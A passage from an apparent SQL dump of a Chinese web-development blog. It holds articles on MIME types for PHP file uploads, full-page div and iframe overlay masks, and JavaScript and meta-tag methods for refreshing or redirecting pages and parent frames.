style=\"text-align: center;\">xls</td>\r\n			<td style=\"text-align: center;\">application/vnd.ms-excel</td>\r\n			<td style=\"text-align: center;\">20</td>\r\n			<td style=\"text-align: center;\">xls</td>\r\n			<td style=\"text-align: center;\">application/vnd.ms-excel</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">21</td>\r\n			<td style=\"text-align: center;\">ppt</td>\r\n			<td style=\"text-align: center;\">application/vnd.ms-powerpoint</td>\r\n			<td style=\"text-align: center;\">21</td>\r\n			<td style=\"text-align: center;\">ppt</td>\r\n			<td style=\"text-align: center;\">application/vnd.ms-powerpoint</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">22</td>\r\n			<td style=\"text-align: center;\">pdf</td>\r\n			<td style=\"text-align: center;\">application/pdf</td>\r\n			<td style=\"text-align: center;\">22</td>\r\n			<td style=\"text-align: center;\">pdf</td>\r\n			<td style=\"text-align: center;\">application/pdf</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">23</td>\r\n			<td style=\"text-align: center;\">chm</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">23</td>\r\n			<td style=\"text-align: center;\">chm</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">24</td>\r\n			<td style=\"text-align: center;\">mdb</td>\r\n			<td style=\"text-align: center;\">application/msaccess</td>\r\n			<td style=\"text-align: center;\">24</td>\r\n			<td style=\"text-align: center;\">mdb</td>\r\n			<td style=\"text-align: center;\">application/msaccess</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">25</td>\r\n			<td style=\"text-align: center;\">sql</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">25</td>\r\n			<td style=\"text-align: center;\">sql</td>\r\n			<td style=\"text-align: center;\">text/plain</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">26</td>\r\n			<td style=\"text-align: center;\">con</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">26</td>\r\n			<td style=\"text-align: center;\">con</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">27</td>\r\n			<td style=\"text-align: center;\">log</td>\r\n			<td style=\"text-align: center;\">text/plain</td>\r\n			<td style=\"text-align: center;\">27</td>\r\n			<td style=\"text-align: center;\">log</td>\r\n			<td style=\"text-align: center;\">text/plain</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">28</td>\r\n			<td style=\"text-align: center;\">dat</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">28</td>\r\n			<td style=\"text-align: center;\">dat</td>\r\n			<td style=\"text-align: center;\">text/plain</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">29</td>\r\n			<td style=\"text-align: center;\">ini</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">29</td>\r\n			<td style=\"text-align: center;\">ini</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">30</td>\r\n			<td style=\"text-align: center;\">php</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">30</td>\r\n			<td style=\"text-align: center;\">php</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">31</td>\r\n			<td style=\"text-align: center;\">html</td>\r\n			<td style=\"text-align: center;\">text/html</td>\r\n			<td style=\"text-align: center;\">31</td>\r\n			<td style=\"text-align: center;\">html</td>\r\n			<td style=\"text-align: center;\">text/html</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">32</td>\r\n			<td style=\"text-align: center;\">htm</td>\r\n			<td style=\"text-align: center;\">text/html</td>\r\n			<td style=\"text-align: center;\">32</td>\r\n			<td style=\"text-align: center;\">htm</td>\r\n			<td style=\"text-align: center;\">text/html</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">33</td>\r\n			<td style=\"text-align: center;\">ttf</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">33</td>\r\n			<td style=\"text-align: center;\">ttf</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">34</td>\r\n			<td style=\"text-align: center;\">fon</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">34</td>\r\n			<td style=\"text-align: center;\">fon</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">35</td>\r\n			<td style=\"text-align: center;\">js</td>\r\n			<td style=\"text-align: center;\">application/x-javascript</td>\r\n			<td style=\"text-align: center;\">35</td>\r\n			<td style=\"text-align: center;\">js</td>\r\n			<td style=\"text-align: center;\">text/html</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">36</td>\r\n			<td style=\"text-align: center;\">xml</td>\r\n			<td style=\"text-align: center;\">text/xml</td>\r\n			<td style=\"text-align: center;\">36</td>\r\n			<td style=\"text-align: center;\">xml</td>\r\n			<td style=\"text-align: center;\">text/xml</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">37</td>\r\n			<td style=\"text-align: center;\">dll</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">37</td>\r\n			<td style=\"text-align: center;\">dll</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"text-align: center;\">38</td>\r\n			<td style=\"text-align: center;\">dll</td>\r\n			<td style=\"text-align: center;\">application/octet-stream</td>\r\n			<td style=\"text-align: center;\">38</td>\r\n			<td style=\"text-align: center;\">class</td>\r\n			<td style=\"text-align: center;\">application/java</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>* application/octet-stream //应用程序<br />\r\n323 text/h323<br />\r\nacx application/internet-property-stream<br />\r\nai application/postscript<br />\r\naif audio/x-aiff<br />\r\naifc audio/x-aiff<br />\r\naiff audio/x-aiff<br />\r\nasf video/x-ms-asf<br />\r\nasr video/x-ms-asf<br />\r\nasx video/x-ms-asf<br />\r\nau audio/basic<br />\r\navi video/x-msvideo<br />\r\naxs application/olescript<br />\r\nbas text/plain<br />\r\nbcpio application/x-bcpio<br />\r\nbin application/octet-stream<br />\r\nbmp image/bmp<br />\r\nc text/plain<br />\r\ncat application/vnd.ms-pkiseccat<br />\r\ncdf application/x-cdf<br />\r\ncer application/x-x509-ca-cert<br />\r\nclass application/octet-stream<br />\r\nclp application/x-msclip<br />\r\ncmx image/x-cmx<br />\r\ncod image/cis-cod<br />\r\ncpio application/x-cpio<br />\r\ncrd application/x-mscardfile<br />\r\ncrl application/pkix-crl<br />\r\ncrt application/x-x509-ca-cert<br />\r\ncsh application/x-csh<br />\r\ncss text/css<br />\r\ndcr application/x-director<br />\r\nder application/x-x509-ca-cert<br />\r\ndir application/x-director<br />\r\ndll application/x-msdownload<br />\r\ndms application/octet-stream<br />\r\ndoc application/msword<br />\r\ndot application/msword<br />\r\ndvi application/x-dvi<br />\r\ndxr application/x-director<br />\r\neps application/postscript<br />\r\netx text/x-setext<br />\r\nevy application/envoy<br />\r\nexe application/octet-stream<br />\r\nfif application/fractals<br />\r\nflr x-world/x-vrml<br />\r\ngif image/gif<br />\r\ngtar application/x-gtar<br />\r\ngz application/x-gzip<br />\r\nh text/plain<br />\r\nhdf application/x-hdf<br />\r\nhlp application/winhlp<br />\r\nhqx application/mac-binhex40<br />\r\nhta application/hta<br />\r\nhtc text/x-component<br />\r\nhtm text/html<br />\r\nhtml text/html<br />\r\nhtt text/webviewhtml<br />\r\nico image/x-icon<br />\r\nief image/ief<br />\r\niii application/x-iphone<br />\r\nins application/x-internet-signup<br />\r\nisp application/x-internet-signup<br />\r\njfif image/pipeg<br />\r\njpe image/jpeg<br />\r\njpeg image/jpeg<br />\r\njpg image/jpeg<br />\r\njpg image/pjpeg<br />\r\njs application/x-javascript<br />\r\nlatex application/x-latex<br />\r\nlha application/octet-stream<br />\r\nlsf video/x-la-asf<br />\r\nlsx video/x-la-asf<br />\r\nlzh application/octet-stream<br />\r\nm13 application/x-msmediaview<br />\r\nm14 application/x-msmediaview<br />\r\nm3u audio/x-mpegurl<br />\r\nman application/x-troff-man<br />\r\nmdb application/x-msaccess<br />\r\nme application/x-troff-me<br />\r\nmht message/rfc822<br />\r\nmhtml message/rfc822<br />\r\nmid audio/mid<br />\r\nmny application/x-msmoney<br />\r\nmov video/quicktime<br />\r\nmovie video/x-sgi-movie<br />\r\nmp2 video/mpeg<br />\r\nmp3 audio/mpeg<br />\r\nmpa video/mpeg<br />\r\nmpe video/mpeg<br />\r\nmpeg video/mpeg<br />\r\nmpg video/mpeg<br />\r\nmpp application/vnd.ms-project<br />\r\nmpv2 video/mpeg<br />\r\nms application/x-troff-ms<br />\r\nmvb application/x-msmediaview<br />\r\nnws message/rfc822<br />\r\noda application/oda<br />\r\np10 application/pkcs10<br />\r\np12 application/x-pkcs12<br />\r\np7b application/x-pkcs7-certificates<br />\r\np7c application/x-pkcs7-mime<br />\r\np7m application/x-pkcs7-mime<br />\r\np7r application/x-pkcs7-certreqresp<br />\r\np7s application/x-pkcs7-signature<br />\r\npbm image/x-portable-bitmap<br />\r\npdf application/pdf<br />\r\npfx application/x-pkcs12<br />\r\npgm image/x-portable-graymap<br />\r\npko application/ynd.ms-pkipko<br />\r\npma application/x-perfmon<br />\r\npmc application/x-perfmon<br />\r\npml application/x-perfmon<br />\r\npmr application/x-perfmon<br />\r\npmw application/x-perfmon<br />\r\npng image/x-png<br />\r\npnm image/x-portable-anymap<br />\r\npot, application/vnd.ms-powerpoint<br />\r\nppm image/x-portable-pixmap<br />\r\npps application/vnd.ms-powerpoint<br />\r\nppt application/vnd.ms-powerpoint<br />\r\nprf application/pics-rules<br />\r\nps application/postscript<br />\r\npub application/x-mspublisher<br />\r\nqt video/quicktime<br />\r\nra audio/x-pn-realaudio<br />\r\nram audio/x-pn-realaudio<br />\r\nras image/x-cmu-raster<br />\r\nrgb image/x-rgb<br />\r\nrmi audio/mid<br />\r\nroff application/x-troff<br />\r\nrtf application/rtf<br />\r\nrtx text/richtext<br />\r\nscd application/x-msschedule<br />\r\nsct text/scriptlet<br />\r\nsetpay application/set-payment-initiation<br />\r\nsetreg application/set-registration-initiation<br />\r\nsh application/x-sh<br />\r\nshar application/x-shar<br />\r\nsit application/x-stuffit<br />\r\nsnd audio/basic<br />\r\nspc application/x-pkcs7-certificates<br />\r\nspl application/futuresplash<br />\r\nsrc application/x-wais-source<br />\r\nsst application/vnd.ms-pkicertstore<br />\r\nstl application/vnd.ms-pkistl<br />\r\nstm text/html<br />\r\nsv4cpio application/x-sv4cpio<br />\r\nsv4crc application/x-sv4crc<br />\r\nt application/x-troff<br />\r\ntar application/x-tar<br />\r\ntcl application/x-tcl<br />\r\ntex application/x-tex<br />\r\ntexi application/x-texinfo<br />\r\ntexinfo application/x-texinfo<br />\r\ntgz application/x-compressed<br />\r\ntif image/tiff<br />\r\ntiff image/tiff<br />\r\ntr application/x-troff<br />\r\ntrm application/x-msterminal<br />\r\ntsv text/tab-separated-values<br />\r\ntxt text/plain<br />\r\nuls text/iuls<br />\r\nustar application/x-ustar<br />\r\nvcf text/x-vcard<br />\r\nvrml x-world/x-vrml<br />\r\nwav audio/x-wav<br />\r\nwcm application/vnd.ms-works<br />\r\nwdb application/vnd.ms-works<br />\r\nwks application/vnd.ms-works<br />\r\nwmf application/x-msmetafile<br />\r\nwps application/vnd.ms-works<br />\r\nwri application/x-mswrite<br />\r\nwrl x-world/x-vrml<br />\r\nwrz x-world/x-vrml<br />\r\nxaf x-world/x-vrml<br />\r\nxbm image/x-xbitmap<br />\r\nxla application/vnd.ms-excel<br />\r\nxlc application/vnd.ms-excel<br />\r\nxlm application/vnd.ms-excel<br />\r\nxls application/vnd.ms-excel<br />\r\nxlt application/vnd.ms-excel<br />\r\nxlw application/vnd.ms-excel<br />\r\nxof x-world/x-vrml<br />\r\nxpm image/x-xpixmap<br />\r\nxwd image/x-xwindowdump<br />\r\nz application/x-compress<br />\r\nzip application/zip -firefox<br />\r\napplication/x-zip-compressed -IE</p>\r\n\r\n<p><br />\r\nphp上传压缩文件(rar,7z,zip)</p>\r\n\r\n<p>php上传可执行文件(exe)</p>\r\n\r\n<p>php上传视频文件,音乐文件,歌词文件(avi,rmvb,3gp,flv,mp3,wav,krc,lrc)</p>\r\n\r\n<p>php上传文本文件和文档文件(word-&gt;doc,excel-&gt;xls,幻灯片-&gt;ppt,pdf,chm)</p>\r\n\r\n<p>php上传数据库文件(access文件,sql文件,con文件,日志文件log, dat文件)</p>\r\n\r\n<p>php上传网页文件,脚本文件,字体文件(ini,php,html,htm,字体文件：ttf,fon, js ,xml)</p>\r\n\r\n<p>php上传其他文件(class类文件,dll动态加载库文件)</p>\r\n',0,1438070380,0,0),(103,1,'网页屏蔽全页面代码','<p>&lt;html&gt;</p>\r\n\r\n<p>&lt;head&gt;</p>\r\n\r\n<p>&lt;style&gt;</p>\r\n\r\n<p>*{&nbsp;&nbsp; margin:0;&nbsp;&nbsp; padding:0;}</p>\r\n\r\n<p>body{&nbsp;&nbsp; height:100%;}</p>\r\n\r\n<p>.dis{&nbsp;&nbsp; width:100%;&nbsp;&nbsp;&nbsp;&nbsp; background:&nbsp;&nbsp; green;&nbsp;&nbsp; position:absolute;&nbsp;&nbsp; left:0;&nbsp;&nbsp; right:0;&nbsp;&nbsp; top:0;&nbsp;&nbsp; bottom:0;&nbsp;&nbsp; -moz-opacity:0.5;&nbsp;&nbsp; filter:alpha(opacity=50);z-index:99;&nbsp;&nbsp; height:100%;&nbsp;&nbsp; }</p>\r\n\r\n<p>&lt;/style&gt;</p>\r\n\r\n<p>&lt;/head&gt;</p>\r\n\r\n<p>&lt;body&gt;</p>\r\n\r\n<p>&lt;select&nbsp;&nbsp; id=sl&gt;</p>\r\n\r\n<p>&lt;option&gt; 1 &lt;/option&gt;</p>\r\n\r\n<p>&lt;option&gt; 2 &lt;/option&gt;</p>\r\n\r\n<p>&lt;option&gt; 3 &lt;/option&gt;</p>\r\n\r\n<p>&lt;/select&gt; &lt;br&gt;</p>\r\n\r\n<p>dsdddddddddddddddd &lt;br&gt;</p>\r\n\r\n<p>&lt;input&nbsp;&nbsp; type=button&nbsp;&nbsp; value= &quot;change &quot;&nbsp;&nbsp; onclick=test()&nbsp;&nbsp; ID= &quot;Button1 &quot;&nbsp;&nbsp; NAME= &quot;Button1 &quot;&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;/body&gt;</p>\r\n\r\n<p>&lt;/html&gt;</p>\r\n\r\n<p>&lt;script&gt;</p>\r\n\r\n<p>function&nbsp;&nbsp; test()</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp; var&nbsp;&nbsp; div&nbsp;&nbsp; =&nbsp;&nbsp; document.createElement( &quot;div &quot;);</p>\r\n\r\n<p>&nbsp; var&nbsp;&nbsp; iframe&nbsp;&nbsp; =&nbsp;&nbsp; document.createElement( &quot;iframe &quot;);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp; iframe.className= &quot;dis &quot;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp; div.className= &quot;dis &quot;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>div.appendChild(iframe);</p>\r\n\r\n<p>&nbsp; document.body.appendChild(div);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&lt;/script&gt;</p>\r\n',0,1438070457,0,0),(104,13,'用div屏蔽全页面代码(滚动条也一起屏蔽)','<p>z.html代码</p>\r\n\r\n<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</p>\r\n\r\n<p>&lt;html&gt;</p>\r\n\r\n<p>&lt;head&gt;</p>\r\n\r\n<p>&lt;/head&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;body&gt;</p>\r\n\r\n<p>&lt;select&nbsp;&nbsp; id=sl&gt;</p>\r\n\r\n<p>&lt;option&gt; 1 &lt;/option&gt;</p>\r\n\r\n<p>&lt;option&gt; 2 &lt;/option&gt;</p>\r\n\r\n<p>&lt;option&gt; 3 &lt;/option&gt;</p>\r\n\r\n<p>&lt;/select&gt; &lt;br&gt;</p>\r\n\r\n<p>dsdddddddddddddddd &lt;br&gt;</p>\r\n\r\n<p>&lt;input&nbsp;&nbsp; type=button&nbsp;&nbsp; value= &quot;change &quot;&nbsp;&nbsp; onclick=test()&nbsp;&nbsp; ID= &quot;Button1 &quot;&nbsp;&nbsp; NAME= &quot;Button1 &quot;&gt;</p>\r\n\r\n<p>1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;</p>\r\n\r\n<p>1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;</p>\r\n\r\n<p>1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;</p>\r\n\r\n<p>1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;1&lt;br /&gt;</p>\r\n\r\n<p>2&lt;br /&gt;</p>\r\n\r\n<p>&lt;/body&gt;</p>\r\n\r\n<p>&lt;/html&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>zz.html代码</p>\r\n\r\n<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</p>\r\n\r\n<p>&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</p>\r\n\r\n<p>&lt;head&gt;</p>\r\n\r\n<p>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</p>\r\n\r\n<p>&lt;title&gt;无标题文档&lt;/title&gt;</p>\r\n\r\n<p>&lt;style&gt;</p>\r\n\r\n<p>*{</p>\r\n\r\n<p>margin:0;</p>\r\n\r\n<p>padding:0;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>body{</p>\r\n\r\n<p>height:100%;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>.dis{</p>\r\n\r\n<p>width:100%;</p>\r\n\r\n<p>height:100%;</p>\r\n\r\n<p>background:green;</p>\r\n\r\n<p>position:absolute;</p>\r\n\r\n<p>left:0;</p>\r\n\r\n<p>top:0;</p>\r\n\r\n<p>-moz-opacity:0.5;</p>\r\n\r\n<p>filter:alpha(opacity=50);</p>\r\n\r\n<p>opacity:0.5;</p>\r\n\r\n<p>z-index:150;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&lt;/style&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;/head&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;body&gt;</p>\r\n\r\n<p>&lt;iframe src=&quot;z.html&quot; style=&quot;width:100%;height:100%;position:absolute;&quot; frameborder=&quot;0&quot; border=&quot;0&quot;&gt;&lt;/iframe&gt;</p>\r\n\r\n<p>&lt;div class=&quot;dis&quot;&gt;&lt;/div&gt;</p>\r\n\r\n<p>&lt;/body&gt;</p>\r\n\r\n<p>&lt;/html&gt;</p>\r\n',0,1438070587,0,0),(105,1,'简单Javascript刷新页面的几种方法(页面刷新与弹出窗口问题解决方法)','<p>window.location.reload();<br />\r\n使用window.open()弹出的弹出窗口，刷新父窗口<br />\r\n非模态刷新父页面 ：window.opener.location.reload()<br />\r\n使用window.showDialog弹出的模式窗口<br />\r\n模态刷新父页面&nbsp;&nbsp; ：window.dialogArguments.location.reload();</p>\r\n\r\n<p>先来看一个简单的例子：<br />\r\n&nbsp;&nbsp; 下面以三个页面分别命名为frame.html、top.html、bottom.html为例来具体说明如何做。<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; frame.html 由上(top.html)下(bottom.html)两个页面组成，代码如下：<br />\r\n&nbsp;&nbsp; &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;<br />\r\n&nbsp;&nbsp; &lt;HTML&gt;<br />\r\n&nbsp;&nbsp; &lt;HEAD&gt;<br />\r\n&nbsp;&nbsp; &lt;TITLE&gt; frame &lt;/TITLE&gt;<br />\r\n&nbsp;&nbsp; &lt;/HEAD&gt;<br />\r\n&nbsp;&nbsp; &lt;frameset rows=&quot;50%,50%&quot;&gt;<br />\r\n&nbsp;&nbsp; &lt;frame name=top src=&quot;top.html&quot;&gt;<br />\r\n&nbsp;&nbsp; &lt;frame name=bottom src=&quot;bottom.html&quot;&gt;<br />\r\n&nbsp;&nbsp; &lt;/frameset&gt;<br />\r\n&nbsp;&nbsp; &lt;/HTML&gt;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; 现在假设top.html (即上面的页面) 有七个button来实现对bottom.html (即下面的页面) 的刷新，可以用以下七种语句，哪个好用自己看着办了。<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; 语句1. window.parent.frames[1].location.reload();<br />\r\n&nbsp;&nbsp; 语句2. window.parent.frames.bottom.location.reload();<br />\r\n&nbsp;&nbsp; 语句3. window.parent.frames[&quot;bottom&quot;].location.reload();<br />\r\n&nbsp;&nbsp; 语句4. window.parent.frames.item(1).location.reload();<br />\r\n&nbsp;&nbsp; 语句5. window.parent.frames.item(&#39;bottom&#39;).location.reload();<br />\r\n&nbsp;&nbsp; 语句6. window.parent.bottom.location.reload();<br />\r\n&nbsp;&nbsp; 语句7. window.parent[&#39;bottom&#39;].location.reload();<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; top.html 页面的代码如下：<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;<br />\r\n&nbsp;&nbsp; &lt;HTML&gt;<br />\r\n&nbsp;&nbsp; &lt;HEAD&gt;<br />\r\n&nbsp;&nbsp; &lt;TITLE&gt; top.html &lt;/TITLE&gt;<br />\r\n&nbsp;&nbsp; &lt;/HEAD&gt;<br />\r\n&nbsp;&nbsp; &lt;BODY&gt;<br />\r\n&nbsp;&nbsp; &lt;input type=button value=&quot;刷新1&quot; onclick=&quot;window.parent.frames[1].location.reload()&quot;&gt;&lt;br&gt;<br />\r\n&nbsp;&nbsp; &lt;input type=button value=&quot;刷新2&quot; onclick=&quot;window.parent.frames.bottom.location.reload()&quot;&gt;&lt;br&gt;<br />\r\n&nbsp;&nbsp; &lt;input type=button value=&quot;刷新3&quot; onclick=&quot;window.parent.frames[&#39;bottom&#39;].location.reload()&quot;&gt;&lt;br&gt;<br />\r\n&nbsp;&nbsp; &lt;input type=button value=&quot;刷新4&quot; onclick=&quot;window.parent.frames.item(1).location.reload()&quot;&gt;&lt;br&gt;<br />\r\n&nbsp;&nbsp; &lt;input type=button value=&quot;刷新5&quot; onclick=&quot;window.parent.frames.item(&#39;bottom&#39;).location.reload()&quot;&gt;&lt;br&gt;<br />\r\n&nbsp;&nbsp; &lt;input type=button value=&quot;刷新6&quot; onclick=&quot;window.parent.bottom.location.reload()&quot;&gt;&lt;br&gt;<br />\r\n&nbsp;&nbsp; &lt;input type=button value=&quot;刷新7&quot; onclick=&quot;window.parent[&#39;bottom&#39;].location.reload()&quot;&gt;&lt;br&gt;<br />\r\n&nbsp;&nbsp; &lt;/BODY&gt;<br />\r\n&nbsp;&nbsp; &lt;/HTML&gt;<br />\r\n&nbsp;&nbsp; 下面是bottom.html页面源代码，为了证明下方页面的确被刷新了，在装载完页面弹出一个对话框。<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; bottom.html 页面的代码如下：<br />\r\n&nbsp;&nbsp; &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;<br />\r\n&nbsp;&nbsp; &lt;HTML&gt;<br />\r\n&nbsp;&nbsp; &lt;HEAD&gt;<br />\r\n&nbsp;&nbsp; &lt;TITLE&gt; bottom.html &lt;/TITLE&gt;<br />\r\n&nbsp;&nbsp; &lt;/HEAD&gt;<br />\r\n&nbsp;&nbsp; &lt;BODY onload=&quot;alert(&#39;我被加载了！&#39;)&quot;&gt;<br />\r\n&nbsp;&nbsp; &lt;h1&gt;This is the content in bottom.html.&lt;/h1&gt;<br />\r\n&nbsp;&nbsp; &lt;/BODY&gt;<br />\r\n&nbsp;&nbsp; &lt;/HTML&gt;<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; 解释一下：<br />\r\n&nbsp;&nbsp; 1.window指代的是当前页面，例如对于此例它指的是top.html页面。<br />\r\n&nbsp;&nbsp; 2.parent指的是当前页面的父页面，也就是包含它的框架页面。例如对于此例它指的是framedemo.html。<br />\r\n&nbsp;&nbsp; 3.frames是window对象，是一个数组。代表着该框架内所有子页面。<br />\r\n&nbsp;&nbsp; 4.item是方法。返回数组里面的元素。<br />\r\n&nbsp;&nbsp; 5.如果子页面也是个框架页面，里面还是其它的子页面，那么上面的有些方法可能不行。<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; 附：<br />\r\n&nbsp;&nbsp; Javascript刷新页面的几种方法：<br />\r\n&nbsp;&nbsp; 1 history.go(0)<br />\r\n&nbsp;&nbsp; 2 location.reload()<br />\r\n&nbsp;&nbsp; 3 location=location<br />\r\n&nbsp;&nbsp; 4 location.assign(location)<br />\r\n&nbsp;&nbsp; 5 document.execCommand(&#39;Refresh&#39;)<br />\r\n&nbsp;&nbsp; 6 window.navigate(location)<br />\r\n&nbsp;&nbsp; 7 location.replace(location)<br />\r\n&nbsp;&nbsp; 8 document.URL=location.href<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; 自动刷新页面的方法:<br />\r\n&nbsp;&nbsp; 1.页面自动刷新：把如下代码加入&lt;head&gt;区域中<br />\r\n&nbsp;&nbsp; &lt;meta http-equiv=&quot;refresh&quot; content=&quot;20&quot;&gt;<br />\r\n&nbsp;&nbsp; 其中20指每隔20秒刷新一次页面.<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; 2.页面自动跳转：把如下代码加入&lt;head&gt;区域中<br />\r\n&nbsp;&nbsp; &lt;meta http-equiv=&quot;refresh&quot; content=&quot;20;url=http://www.wyxg.com&quot;&gt;<br />\r\n&nbsp;&nbsp; 其中20指隔20秒后跳转到http://www.wyxg.com页面<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; 3.页面自动刷新js版<br />\r\n&nbsp;&nbsp; &lt;script language=&quot;JavaScript&quot;&gt;<br />\r\n&nbsp;&nbsp; function myrefresh()<br />\r\n&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp; window.location.reload();<br />\r\n&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; setTimeout(&#39;myrefresh()&#39;,1000); //指定1秒刷新一次<br />\r\n&nbsp;&nbsp; &lt;/script&gt;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; ASP.NET如何输出刷新父窗口脚本语句<br />\r\n&nbsp;&nbsp; 1. this.response.write(&quot;&lt;script&gt;opener.location.reload();&lt;/script&gt;&quot;);<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; 2. this.response.write(&quot;&lt;script&gt;opener.window.location.href = opener.window.location.href;&lt;/script&gt;&quot;);<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; 3. Response.Write(&quot;&lt;script language=javascript&gt;opener.window.navigate(&#39;&#39;你要刷新的页.asp&#39;&#39;);&lt;/script&gt;&quot;)<br 